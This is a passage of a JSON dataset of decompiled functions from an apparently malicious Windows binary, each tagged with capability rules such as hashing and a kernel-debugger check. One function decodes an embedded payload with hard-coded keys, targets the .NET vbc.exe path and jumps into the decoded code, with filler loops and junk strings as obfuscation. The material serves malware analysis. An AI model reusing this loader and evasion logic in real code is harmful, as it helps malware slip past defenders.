  }\n    var_20h = var_f5h._0_1_;\n    uVar2 = fcn.004017c1();\n    if ((uVar2 & 0x3000) == 0x3000) {\n        var_24h = 0x54673d;\n        if (((var_20h + 2 <= arg_24h) && (arg_20h[var_20h] == '0')) &&\n           ((arg_20h[var_20h + 1] == 'x' || (arg_20h[var_20h + 1] == 'X')))) {\n            var_20h = var_20h + 2;\n        }\n    }\n    else {\n        var_24h = 0x54673a;\n    }\n    var_28h = fcn.0040275c(arg_20h, var_24h);\n    var_2ah = 0x2e;\n    ppuVar3 = fcn.00401357();\n    var_2ah = var_2ah & 0xff00 | **ppuVar3;\n    var_30h = fcn.0040275c(arg_20h, &var_2ah);\n    fcn.00402f81(&var_3ch);\n    var_10h = 0;\n    var_34h = fcn.00403616(&var_3ch);\n    fcn.00405146();\n    var_10h = 0xffffffff;\n    fcn.0040375b(arg_24h, 0);\n    uVar4 = fcn.00401b68(0);\n    var_10h = 1;\n    fcn.004056be(arg_20h, arg_20h + arg_24h, uVar4);\n    fcn.00402f81(&var_60h);\n    var_10h = 3;\n    var_58h = fcn.00406433(&var_60h);\n    fcn.00405146();\n    var_10h = 1;\n    fcn.00404cd2(&var_78h);\n    var_10h = 2;\n    var_79h = fcn.0040596b();\n    if (var_30h != arg_24h) {\n        uVar1 = fcn.00401181();\n        puVar5 = fcn.00401b68(var_30h);\n        *puVar5 = uVar1;\n    }\n    if (var_30h == arg_24h) {\n        var_12ch = var_28h;\n    }\n    else {\n        var_12ch = var_30h;\n    }\n    var_80h = var_12ch;\n    var_84h = fcn.00402621(0);\n    while( true ) {\n        bVar8 = false;\n        if ((*var_84h != '\\x7f') && (bVar8 = false,  '\\0' < *var_84h)) {\n            bVar8 = *var_84h < var_80h - var_20h;\n        }\n        if (!bVar8) break;\n        var_80h = var_80h - *var_84h;\n        fcn.004057f9(var_80h, 1, var_79h);\n        if ('\\0' < var_84h[1]) {\n            var_84h = var_84h + 1;\n        }\n    }\n    uVar6 = fcn.0040458e();\n    uVar9 = fcn.0040199c();\n    iVar7 = uVar9 >> 0x20;\n    uVar2 = uVar9 == 0;\n    if (((SBORROW4(iVar7, uVar2) != false) == iVar7 - uVar2 < 0) && (uVar2 = fcn.0040199c(),  uVar6 < uVar2)) {\n        var_88h = fcn.0040199c();\n        var_88h = var_88h - uVar6;\n    }\n    else {\n        var_88h = 0;\n    }\n    var_8ch = fcn.004017c1();\n    uVar2 = var_20h;\n    var_8ch = var_8ch & 0x1c0;\n    if ((var_8ch == 0x40) || (var_8ch == 0x100)) {\n        if (var_8ch == 0x100) {\n            uVar4 = fcn.00401b68(0);\n            _var_bch = _arg_10h;\n            fcn.00401aaf(arg_8h, &var_b4h, arg_10h, noname_3, uVar4, uVar2);\n            fcn.004029aa(arg_8h, &var_c4h, _var_b4h, _var_b4h >> 0x20, arg_1ch, var_88h);\n            arg_10h = var_c4h;\n            var_88h = 0;\n            var_a0h = var_c0h;\n        }\n        else {\n            uVar4 = fcn.00401b68(0);\n            _var_dch = _arg_10h;\n            fcn.00401aaf(arg_8h, &var_d4h, arg_10h, noname_3, uVar4, uVar2);\n            arg_10h = var_d4h;\n            var_a0h = var_d0h;\n        }\n    }\n    else {\n        _var_9ch = _arg_10h;\n        fcn.004029aa(arg_8h, &var_94h, arg_10h, noname_3, arg_1ch, var_88h);\n        uVar2 = var_20h;\n        var_88h = 0;\n        uVar4 = fcn.00401b68(0);\n        fcn.00401aaf(arg_8h, &var_a4h, _var_94h, _var_94h >> 0x20, uVar4, uVar2);\n        arg_10h = var_a4h;\n    }\n    iVar7 = uVar6 - var_20h;\n    uVar4 = fcn.00401b68(var_20h);\n    fcn.00401aaf(arg_8h, &var_e4h, arg_10h, var_a0h, uVar4, iVar7);\n    fcn.004047d2(0, 0);\n    fcn.004029aa(arg_8h, arg_ch, _var_e4h, _var_e4h >> 0x20, arg_1ch, var_88h);\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_ch;\n}\n",
        "token_count": 2174
    },
    "004038c3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.004038c3(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint noname_9, uint arg_30h, uint arg_34h)\n\n{\n    int32_t iStack100;\n    \n    for (iStack100 = 0x22; 0 < iStack100; iStack100 = iStack100 + -1) {\n    }\n    return *0x547004;\n}\n",
        "token_count": 136
    },
    "0040399a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040cf08)\n\nuint __cdecl fcn.0040399a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uint uStack60;\n    uint var_34h;\n    uint var_30h;\n    uchar var_29h;\n    int32_t var_28h;\n    uint var_24h;\n    uint8_t var_1dh;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &uStack80;\n    var_30h = arg_8h;\n    var_34h = arg_8h;\n    var_10h = 0xffffffff;\n    var_14h = 0x417f30;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_1dh = arg_10h & 1;\n    iStack68 = fcn.004068de();\n    iStack68 = iStack68 + 1;\n    var_28h = iStack68;\n    uStack72 = fcn.004052c7();\n    uStack80 = 0;\n    if ((var_1dh & 1) != 0) {\n        uStack80 = 0xfde9;\n    }\n    uStack60 = 0;\n    uStack64 = 0;\n    uStack76 = 0;\n    var_24h = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    var_29h = 0;\n    fcn.004039a9();\n    var_10h = 0;\n    fcn.00401d66(var_24h, 0);\n    uVar2 = var_24h;\n    uVar3 = fcn.004060a0();\n    iVar1 = var_28h;\n    uVar4 = fcn.004052c7();\n    uVar5 = 0;\n    if ((var_1dh & 1) != 0) {\n        uVar5 = 0xfde9;\n    }\n    (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar5, 0, uVar4, iVar1, uVar3, uVar2);\n    *in_FS_OFFSET = var_18h;\n    return var_34h;\n}\n",
        "token_count": 604
    },
    "004039cc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004039cc(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    uVar1 = **0x574458 - 0x41;\n    *0x574458 = *0x574458 + 1;\n    if (0x14 < uVar1) {\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        *(arg_8h + 1) = 2;\n        return arg_8h;\n    }\n    var_8h = 0;\n    var_4h = 2;\n    if ((~(*0x574460 >> 1) & 1) != 0) {\n        uVar1 = uVar1 & 0xfffffffe;\n        if (uVar1 < 0xd) {\n            if (uVar1 == 0xc) {\n                arg_8h_00 = 7;\n            }\n            else if (uVar1 == 0) {\n                arg_8h_00 = 1;\n            }\n            else if (uVar1 == 2) {\n                arg_8h_00 = 2;\n            }\n            else if (uVar1 == 4) {\n                arg_8h_00 = 4;\n            }\n            else if (uVar1 == 6) {\n                arg_8h_00 = 3;\n            }\n            else {\n                if (uVar1 != 8) goto code_r0x0048e3bb;\n                arg_8h_00 = 5;\n            }\n        }\n        else if (uVar1 == 0xe) {\n            arg_8h_00 = 8;\n        }\n        else if (uVar1 == 0x10) {\n            arg_8h_00 = 6;\n        }\n        else if (uVar1 == 0x12) {\n            arg_8h_00 = 9;\n        }\n        else {\n            if (uVar1 != 0x14) goto code_r0x0048e3bb;\n            arg_8h_00 = 10;\n        }\n        _var_10h = fcn.00402d29(arg_8h_00);\n        fcn.004022f7(&var_10h);\n    }\ncode_r0x0048e3bb:\n    *arg_8h = var_8h;\n    arg_8h[1] = var_4h;\n    return arg_8h;\n}\n",
        "token_count": 613
    },
    "004039ea": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004039ea(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack212;\n    uchar auStack208 [24];\n    uchar auStack184 [24];\n    int32_t iStack160;\n    uchar auStack156 [24];\n    uchar auStack132 [48];\n    uint uStack84;\n    uint uStack56;\n    uint uStack52;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff18;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4500a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_8h & 1;\n    uStack52 = 0x40c0b180;\n    uStack56 = 0;\n    fcn.00401e79(\"hfayjeajjlibtzbbksuqzwiosaikjknxqnaeqrbellqzpneceerxhyifmmgrndqfagbwfpcs\");\n    uStack84 = 0x13e;\n    uStack24 = 0;\n    fcn.00401e79(\"bglpycukarmkvgeyykuytgyhunldxxazvddemkhlnsedszktuebzjihdcyplsgsjrlkqkjvziuzbsrfeabxa\");\n    uStack24 = 1;\n    fcn.00401e79(\"hfayjeajjlibtzbbksuqzwiosaikjknxqnaeqrbellqzpneceerxhyifmmgrndqfagbwfpcs\");\n    uStack24 = 3;\n    fcn.00401e79(\"hfayjeajjlibtzbbksuqzwiosaikjknxqnaeqrbellqzpneceerxhyifmmgrndqfagbwfpcs\");\n    uVar1 = fcn.00405b37(auStack156, auStack132);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack160 = 0xf; 0 < iStack160; iStack160 = iStack160 + -1) {\n        }\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"bglpycukarmkvgeyykuytgyhunldxxazvddemkhlnsedszktuebzjihdcyplsgsjrlkqkjvziuzbsrfeabxa\");\n    uStack24 = 2;\n    fcn.00401e79(\"bglpycukarmkvgeyykuytgyhunldxxazvddemkhlnsedszktuebzjihdcyplsgsjrlkqkjvziuzbsrfeabxa\");\n    uVar1 = fcn.00405b37(auStack208, auStack184);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack212 = 4; 0 < iStack212; iStack212 = iStack212 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x176b8;\n}\n",
        "token_count": 830
    },
    "004039ef": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004c1b4c)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.004039ef(uint arg_8h, uint16_t *arg_ch, uint16_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint64_t uVar1;\n    uint16_t *puVar2;\n    char cVar3;\n    uint *puVar4;\n    uint16_t *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t extraout_ECX;\n    uint16_t uVar8;\n    uint32_t arg_8h_00;\n    uint64_t uVar9;\n    int64_t iVar10;\n    int32_t var_b8h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar2 = arg_ch;\n    cVar3 = fcn.00402630();\n    if (cVar3 != '\\0') {\n        if ((arg_14h == 0) || ((1 < arg_14h && (arg_14h < 0x25)))) {\n            fcn.004058a8(arg_8h);\n            uVar1 = 0;\n            uVar8 = *arg_ch;\n            puVar5 = arg_ch + 1;\n            while( true ) {\n                arg_8h_00 = uVar8;\n                iVar6 = fcn.00402162(arg_8h_00, 8);\n                if (iVar6 == 0) break;\n                uVar8 = *puVar5;\n                puVar5 = puVar5 + 1;\n            }\n            var_4h = arg_18h & 0xff;\n            if (uVar8 == 0x2d) {\n                var_4h = var_4h | 2;\ncode_r0x004c162b:\n                arg_8h_00 = *puVar5;\n                puVar5 = puVar5 + 1;\n            }\n            else if (uVar8 == 0x2b) goto code_r0x004c162b;\n            iVar6 = 0xff10;\n            var_14h = 0x6f0;\n            var_1ch = 0x966;\n            arg_ch = puVar5;\n            if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x004c193e;\n            uVar8 = arg_8h_00;\n            if (uVar8 < 0x30) goto code_r0x004c18c9;\n            if (uVar8 < 0x3a) {\n                iVar6 = arg_8h_00 - 0x30;\ncode_r0x004c18c4:\n                if (iVar6 == -1) goto code_r0x004c18c9;\n            }\n            else {\n                if (0xff0f < uVar8) {\n                    if (uVar8 < 0xff1a) {\ncode_r0x004c179b:\n                        iVar6 = arg_8h_00 - iVar6;\n                    }\n                    else {\n                        iVar6 = -1;\n                    }\n                    goto code_r0x004c18c4;\n                }\n                if (0x65f < uVar8) {\n                    if (uVar8 < 0x66a) {\n                        iVar6 = arg_8h_00 - 0x660;\n                        goto code_r0x004c18c4;\n                    }\n                    if ((0x6ef < uVar8) &&\n                       ((iVar6 = 0x6f0,  uVar8 < 0x6fa ||\n                        ((0x965 < uVar8 &&\n                         ((iVar6 = var_1ch,  uVar8 < 0x970 ||\n                          ((iVar6 = 0x9e6,  0x9e5 < uVar8 &&\n                           ((uVar8 < 0x9f0 ||\n                            ((iVar6 = 0xa66,  0xa65 < uVar8 &&\n                             ((uVar8 < 0xa70 ||\n                              ((iVar6 = 0xae6,  0xae5 < uVar8 &&\n                               ((uVar8 < 0xaf0 ||\n                                ((iVar6 = 0xb66,  0xb65 < uVar8 &&\n                                 ((uVar8 < 0xb70 ||\n                                  ((iVar6 = 0xc66,  0xc65 < uVar8 &&\n                                   ((uVar8 < 0xc70 ||\n                                    ((iVar6 = 0xce6,  0xce5 < uVar8 &&\n                                     ((uVar8 < 0xcf0 ||\n                                      ((iVar6 = 0xd66,  0xd65 < uVar8 &&\n                                       ((uVar8 < 0xd70 ||\n                                        ((iVar6 = 0xe50,  0xe4f < uVar8 &&\n                                         ((uVar8 < 0xe5a ||\n                                          ((iVar6 = 0xed0,  0xecf < uVar8 &&\n                                           ((uVar8 < 0xeda ||\n                                            ((iVar6 = 0xf20,  0xf1f < uVar8 &&\n                                             ((uVar8 < 0xf2a ||\n                                              ((iVar6 = 0x1040,  0x103f < uVar8 &&\n                                               ((uVar8 < 0x104a ||\n                                                ((iVar6 = 0x17e0,  0x17df < uVar8 &&\n                                                 ((uVar8 < 0x17ea ||\n                                                  ((iVar6 = 0x1810,  0x180f < uVar8 && (uVar8 < 0x181a))))))))))))))))))\n                                          )))))))))))))))))))))))))))))))))))))))) goto code_r0x004c179b;\n                }\ncode_r0x004c18c9:\n                if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                    iVar6 = -1;\n                }\n                else {\n                    uVar7 = arg_8h_00;\n                    if (arg_8h_00 - 0x61 < 0x1a) {\n                        uVar7 = arg_8h_00 - 0x20;\n                    }\n                    iVar6 = uVar7 - 0x37;\n                }\n            }\n            if (iVar6 == 0) {\n                uVar7 = *puVar5;\n                arg_ch = puVar5 + 1;\n                if ((uVar7 == 0x78) || (uVar7 == 0x58)) {\n                    if (arg_14h == 0) {\n                        arg_14h = 0x10;\n                    }\n                    arg_8h_00 = *arg_ch;\n                    arg_ch = puVar5 + 2;\n                }\n                else {\n                    if (arg_14h == 0) {\n                        arg_14h = 8;\n                    }\n                    fcn.00402f04(uVar7);\n                }\n            }\n            else if (arg_14h == 0) {\n                arg_14h = 10;\n            }\ncode_r0x004c193e:\n            uVar9 = fcn.00401820(0xffffffff, 0xffffffff, arg_14h, arg_14h >> 0x1f, arg_14h);\n            do {\n                var_10h = uVar1 >> 0x20;\n                var_8h = uVar1;\n                uVar8 = arg_8h_00;\n                if (uVar8 < 0x30) {\ncode_r0x004c1afb:\n                    if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                        uVar7 = 0xffffffff;\n                    }\n                    else {\n                        uVar7 = arg_8h_00;\n                        if (arg_8h_00 - 0x61 < 0x1a) {\n                            uVar7 = arg_8h_00 - 0x20;\n                        }\n                        uVar7 = uVar7 - 0x37;\n                    }\n                }\n                else {\n                    if (uVar8 < 0x3a) {\n                        uVar7 = arg_8h_00 - 0x30;\n                    }\n                    else {\n                        iVar6 = 0xff10;\n                        if (uVar8 < 0xff10) {\n                            if ((uVar8 < 0x660) ||\n                               ((iVar6 = 0x660,  0x669 < uVar8 &&\n                                ((uVar8 < 0x6f0 ||\n                                 ((iVar6 = var_14h,  0x6f9 < uVar8 &&\n                                  ((uVar8 < 0x966 ||\n                                   ((iVar6 = var_1ch,  0x96f < uVar8 &&\n                                    ((iVar6 = 0x9e6,  uVar8 < 0x9e6 ||\n                                     ((0x9ef < uVar8 &&\n                                      ((iVar6 = 0xa66,  uVar8 < 0xa66 ||\n                                       ((0xa6f < uVar8 &&\n                                        ((iVar6 = 0xae6,  uVar8 < 0xae6 ||\n                                         ((0xaef < uVar8 &&\n                                          ((iVar6 = 0xb66,  uVar8 < 0xb66 ||\n                                           ((0xb6f < uVar8 &&\n                                            ((iVar6 = 0xc66,  uVar8 < 0xc66 ||\n                                             ((0xc6f < uVar8 &&\n                                              ((iVar6 = 0xce6,  uVar8 < 0xce6 ||\n                                               ((0xcef < uVar8 &&\n                                                ((iVar6 = 0xd66,  uVar8 < 0xd66 ||\n                                                 ((0xd6f < uVar8 &&\n                                                  ((iVar6 = 0xe50,  uVar8 < 0xe50 ||\n                                                   ((0xe59 < uVar8 &&\n                                                    ((iVar6 = 0xed0,  uVar8 < 0xed0 ||\n                                                     ((0xed9 < uVar8 &&\n                                                      ((iVar6 = 0xf20,  uVar8 < 0xf20 ||\n                                                       ((0xf29 < uVar8 &&\n                                                        ((iVar6 = 0x1040,  uVar8 < 0x1040 ||\n                                                         ((0x1049 < uVar8 &&\n                                                          ((iVar6 = 0x17e0,  uVar8 < 0x17e0 ||\n                                                           ((0x17e9 < uVar8 &&\n                                                            ((iVar6 = 0x1810,  uVar8 < 0x1810 || (0x1819 < uVar8))))))))\n                                                         ))))))))))))))))))))))))))))))))))))))))))))))))))))))\n                            goto code_r0x004c1afb;\n                        }\n                        else if (0xff19 < uVar8) {\n                            uVar7 = 0xffffffff;\n                            goto code_r0x004c1af6;\n                        }\n                        uVar7 = arg_8h_00 - iVar6;\n                    }\ncode_r0x004c1af6:\n                    if (uVar7 == 0xffffffff) goto code_r0x004c1afb;\n                }\n                if ((uVar7 == 0xffffffff) || (arg_14h <= uVar7)) goto code_r0x004c1bb7;\n                if ((uVar1 < uVar9) || ((uVar9 == uVar1 && ((arg_14h != 0 || (uVar7 <= extraout_ECX)))))) {\n                    iVar10 = fcn.00402685(arg_14h, arg_14h >> 0x1f, uVar1);\n                    uVar1 = iVar10 + 0x1c;\n                    var_4h = var_4h | 8;\n                }\n                else {\n                    var_4h = var_4h | 0xc;\n                }\n                arg_8h_00 = *arg_ch;\n                arg_ch = arg_ch + 1;\n            } while( true );\n        }\n        puVar4 = fcn.00403a35();\n        *puVar4 = 0x16;\n        fcn.004037ce();\n    }\n    uVar1 = 0;\ncode_r0x004c15bc:\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    return uVar1;\ncode_r0x004c1bb7:\n    fcn.00402f04(arg_8h_00);\n    if ((var_4h & 8) == 0) {\n        uVar1 = 0;\n        arg_ch = puVar2;\n    }\n    else {\n        cVar3 = fcn.00403b93(var_4h, var_8h, var_10h);\n        if (cVar3 == '\\0') {\n            if ((var_4h & 2) != 0) {\n                uVar1 = CONCAT44(-(var_10h + (var_8h != 0)), -var_8h);\n            }\n        }\n        else {\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x22;\n            if ((var_4h & 1) == 0) {\n                uVar1 = 0xffffffffffffffff;\n            }\n            else if ((var_4h & 2) == 0) {\n                uVar1 = 0x7fffffffffffffff;\n            }\n            else {\n                uVar1 = 0x8000000000000000;\n            }\n        }\n    }\n    if (var_ach != '\\0') {\n        *(var_b8h + 0x350) = *(var_b8h + 0x350) & 0xfffffffd;\n    }\n    goto code_r0x004c15bc;\n}\n",
        "token_count": 3418
    },
    "00403a71": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00403a71(void)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint8_t var_21h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &var_28h;\n    var_10h = 0xffffffff;\n    var_14h = 0x426f40;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    uVar1 = fcn.0040214e();\n    var_21h = (uVar1 ^ 0xff) & 1;\n    if (var_21h != 0) {\n        var_10h = 1;\n        fcn.0040550b();\n    }\n    fcn.00405f01();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 230
    },
    "00403a94": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0040d7e9)\n// WARNING: Removing unreachable block (ram,0x0040d7bd)\n// WARNING: Removing unreachable block (ram,0x0040d761)\n// WARNING: Removing unreachable block (ram,0x0040d703)\n// WARNING: Removing unreachable block (ram,0x0040d4fb)\n// WARNING: Removing unreachable block (ram,0x0040d6ae)\n// WARNING: Removing unreachable block (ram,0x0040d729)\n// WARNING: Removing unreachable block (ram,0x0040d7a3)\n// WARNING: Removing unreachable block (ram,0x0040d85e)\n\nfloat10 __cdecl fcn.00403a94(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uchar *puStack00000064;\n    uint *puStack00000074;\n    uint *puStack00000078;\n    uint *puStack0000007c;\n    int32_t iStack0000008c;\n    int32_t iStack00000090;\n    uint uStack00000094;\n    uint in_stack_000000b8;\n    uint in_stack_000000bc;\n    ulong uStack000000b8;\n    char in_stack_000000c3;\n    char in_stack_000000c4;\n    char in_stack_000000c5;\n    char in_stack_000000c6;\n    uchar in_stack_000000c7;\n    uint in_stack_000000c8;\n    uint in_stack_000000cc;\n    uint in_stack_000000d4;\n    uint in_stack_000000d8;\n    uint in_stack_000000dc;\n    uint in_stack_000000f8;\n    uint in_stack_000000fc;\n    uint in_stack_00000100;\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    double dVar4;\n    int32_t iVar5;\n    uint var_ch;\n    \n    puStack00000064 = &stack0xfffffffc;\n    fcn.00401de8();\n    iVar5 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0x00047340;\n    puStack00000074 = &stack0x0000000c;\n    puStack00000078 = &stack0x00000028;\n    puStack0000007c = &stack0x00000048;\n    bVar3 = true;\n    while (bVar3) {\n        bVar3 = false;\n    }\n    bVar3 = true;\n    while (bVar3) {\n        bVar3 = false;\n    }\n    bVar3 = true;\n    while (bVar3) {\n        bVar3 = false;\n    }\n    bVar3 = true;\n    while (bVar3) {\n        bVar3 = false;\n    }\n    bVar3 = true;\n    while (bVar3) {\n        bVar3 = false;\n    }\n    (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)();\n    iVar2 = 0;\n    for (iVar1 = 0; iVar1 < 0x37686; iVar1 = iVar1 + 1) {\n        iVar2 = iVar2 + 1;\n    }\n    if (iVar2 == 0x37686) {\n        fcn.00405830();\n        in_stack_00000100 = 0;\n        in_stack_000000fc = 0;\n        in_stack_000000f8 = 0x590813;\n        fcn.00401e79(\"C:\\\\Windows\\\\Microsoft.NET\\\\Fra\");\n        fcn.004042af(\"mework\\\\v4.0.30319\\\\vbc.exe\");\n        in_stack_000000dc = 0x473631a5;\n        in_stack_000000d8 = 0;\n        in_stack_000000d4 = 0x101b;\n        in_stack_000000cc = 0;\n        in_stack_000000c8 = 0x950075;\n        in_stack_000000c6 = '\\x01';\n        while (in_stack_000000c6 != '\\0') {\n            in_stack_000000c6 = '\\0';\n        }\n        in_stack_000000c5 = '\\x01';\n        while (in_stack_000000c5 != '\\0') {\n            in_stack_000000c5 = '\\0';\n        }\n        in_stack_000000c4 = '\\x01';\n        while (in_stack_000000c4 != '\\0') {\n            in_stack_000000c4 = '\\0';\n        }\n        in_stack_000000c3 = '\\x01';\n        while (in_stack_000000c3 != '\\0') {\n            in_stack_000000c3 = '\\0';\n        }\n        in_stack_000000c7 = 0;\n        in_stack_0000001c = 0;\n        in_stack_00000018 = 0;\n        in_stack_00000054 = 0x4f8d53;\n        in_stack_00000050 = 0;\n        in_stack_0000004c = 0x9da0d;\n        in_stack_00000048 = 0x5a;\n        in_stack_00000044 = 0x9fd3e;\n        in_stack_00000040 = 0x4afc;\n        in_stack_0000003c = 0;\n        in_stack_00000038 = 0x8f7a6;\n        in_stack_00000034 = 0x4e72fa;\n        in_stack_00000030 = 0x74d85d;\n        in_stack_0000002c = 0;\n        in_stack_00000028 = 0xfe61;\n        in_stack_00000024 = 0x12342;\n        in_stack_00000020 = 0xb8bac;\n        in_stack_00000014 = 0x7742;\n        in_stack_00000010 = 0xcd;\n        in_stack_0000000c = 0;\n        uStack000000b8 =\n             fcn.004068a2(0x571000, 0x77e, 0x299, 0xa3d70a3d, 0x40800370, 0x30d, 0, 0x21e4, 0, 0x283, 0, 0xcd, 0x7742, 0\n                          , 0, 0xb8bac, 0x12342, 0xfe61, 0, 0x74d85d, 0x4e72fa, 0x8f7a6, 0, 0x4afc, 0x9fd3e, 0x5a, \n                          0x9da0d, 0, 0x4f8d53);\n        fcn.004063d4(\"ryy6u9x6qFf1C9uGzZEZkL3R2oUz70wsSsoAV0SdpRDX5LnDCSYJVmbBNaTDU8zJRd9JzfitobkgSj4pKJ0xNX8w67\", \n                     0x571000, 0x77e, 0x5b);\n        fcn.0040399a(&stack0x000000a0, &stack0x000000e0, 1);\n        fcn.004060a0();\n        iVar2 = fcn.00401c8f();\n        fcn.004063d4(\"R2v9qXwKNhgOu2jYnbWZHRLs9JJL1m28QX7SBLxXtJeCn50LeRQKsCiKaBAjdr8lh4u5AKXJEg97bHgjgKyLkBLQHK\", \n                     &stack0x00000104, 0x47200, 0x5b);\n        (*(iVar2 + 0x571000))();\n        dVar4 = 0.0;\n        uStack00000094 = 1;\n        fcn.0040535d();\n        fcn.00403b02();\n    }\n    else {\n        for (iStack00000090 = 0x60; 0 < iStack00000090; iStack00000090 = iStack00000090 + -1) {\n        }\n        for (iStack0000008c = 0x47; 0 < iStack0000008c; iStack0000008c = iStack0000008c + -1) {\n        }\n        uStack00000094 = 1;\n        dVar4 = *0x4ec1c8;\n    }\n    